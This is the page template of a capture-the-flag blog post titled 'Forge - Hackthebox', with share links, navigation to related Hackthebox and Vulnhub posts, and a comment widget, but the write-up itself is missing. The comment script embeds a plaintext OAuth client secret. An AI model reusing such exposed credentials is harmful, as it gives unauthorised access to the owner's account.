	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&title=《Forge - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&title=《Forge - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Forge - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/10/07/Vulnhub/Vulnhub%20-BlueSky/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">BlueSky - Vulnhub</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/09/27/Hackthebox/Hackthebox-Validation/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Validation - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&title=《Forge - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&title=《Forge - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Forge - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3aW27DMAwEwNz/0ukBCru7opkWxfiryMPV+ENklnq94utdXvf3uX/96m73dx5deHh4eI8u/ftnrl65X2j7H68+X98BDw8Pb42XbNbJuwmvXXqynsvX8fDw8P4ML+9m2143fwR4eHh4/4N3X0LmBQMPDw/v7/CSMGKSmibtch4Br2QteHh4eCfzqVd+69/9e2W+h4eHh7d2IKBtbefl4X104eHh4W3w8g03Rz7Vmt8/iHydeHh4eBu89qPFphwsNAeMxmB4eHh4a7x8oWeF5DPjsVGdwcPDw7vlJdt6HknkW//8eGv0XTw8PLwFXruJT8b5k+MCo8keHh4e3qO8tjlOlthu7m1bnw/S8PDw8D7Da9vrs8FY27InD+6ymcbDw8Nb481jiOSebfkZBSV4eHh4C7x2wN+Gqu0jOBu5JUM1PDw8vD1eO6TP2+v2MU2CYDw8PLw93tnXzuKGtoGeFIaoyuHh4eENeO0IajIeawtP3qBfninDw8PDW+MlN23POJ014k89aDw8PLwNXjvUTxbRTu3nB7zw8PDwPs9ri0EeDcyPZOVX9F08PDy8ZV7b1M5D2wmyLgx4eHh4R7y8JT17d77dtwXshxgXDw8Pb8w7Gy/l4UIbMeQrKWIOPDw8vI/w8jF/24jn321Dh1F0i4eHhzfgnQWs7db/VAmJHiIeHh7eGq9tZ9ttuo0q5pEuHh4e3gbvXV45tT1eMIktLh8KHh4e3gJvMpjPG+U8rm0PaT08T8PDw8OLefXP+3Js1m7cedkoYlw8PDy8BV47GEsW0TbK+RjsNHjBw8PD+31eGw3kLfLkwMEP8z08PDy8j/OSMpDnA200XAcieHh4eGu8yfBpMrLKi01+VAsPDw9vm9f+on9qZHU2Nnt4soeHh4fX8b4ABtx9goRT+ZAAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
